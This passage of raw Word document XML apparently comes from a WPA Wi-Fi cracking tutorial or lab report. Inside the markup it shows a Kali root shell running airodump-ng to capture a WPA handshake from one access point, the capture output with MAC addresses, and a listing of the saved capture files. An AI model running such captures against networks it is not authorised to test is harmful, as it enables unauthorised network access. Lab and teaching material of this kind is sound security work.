      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>f d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>sab</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>for [phy0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
      <w:r>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>an0)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="74"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:hyperlink r:id="rId58">
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-6"/>
          </w:rPr>
          <w:t>r</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
          </w:rPr>
          <w:t>oot@ka</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>li</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="2"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>~</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
          </w:rPr>
          <w:t>#</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>odump-ng -w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>athe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>os -c 6 --b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>d 14:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>F</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>6:5A:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>F</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>4:57:22</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>n0mon</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CH</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="59"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">6 </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">][ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>El</w:t>
      </w:r>
      <w:r>
        <w:t>apsed:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">5 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>mi</w:t>
      </w:r>
      <w:r>
        <w:t>ns ][ 2016-10-05 01</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>35</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>][</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-19"/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ha</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>dshak</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>14</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>F6</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>5A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>F4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>57:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="160"/>
      </w:pPr>
      <w:r>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">SID                      </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="9"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">PWR  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="8"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:t>XQ  B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">acons   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
      <w:r>
        <w:t>Da</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>a, #</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s  CH  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">B   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>NC  CIPH</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-14"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>AU</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>H E</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:ind w:left="160" w:right="187"/>
      </w:pPr>
      <w:r>
        <w:t>14</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>F6</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>5A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>F4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>57</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">22  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="37"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">-31     </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">100     3104        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="38"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>10036    0   6     54e.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="56"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-24"/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">A </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="49"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">MP </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="53"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:t>SK  B B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">SID                      </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="9"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-19"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-27"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ION                  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>PWR   R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>at</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">e   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ost  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="59"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Fra</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>es  Probe</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="10"/>
        <w:ind w:left="160"/>
      </w:pPr>
      <w:r>
        <w:t>14</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>F6</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>5A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>F4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>57</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">22  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="37"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>70</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>05</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>A3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>7</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">E   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">-32    2e-        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">0        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="50"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">0        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="48"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>10836</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hyperlink r:id="rId59">
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-6"/>
          </w:rPr>
          <w:t>r</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
          </w:rPr>
          <w:t>oot@ka</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>li</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="2"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>~</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
          </w:rPr>
          <w:t>#</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>s -l</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>10348</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>w-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>--</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t>- 1 root</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>root</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">10580359 Oct </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>5 01</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>35</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>athe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>os-01.cap</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>w-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>--</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t>- 1 root</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">root    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="59"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">481 Oct </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>5 01</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>35 a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>heros-01.csv</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>w-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>--</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t>- 1 root</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">root    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="59"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">598 Oct </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>5 01</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>35 a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>heros-01.k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>.csv</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>w-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>--</w:t>
      </w:r>
      <w:r>
        <w:rPr>
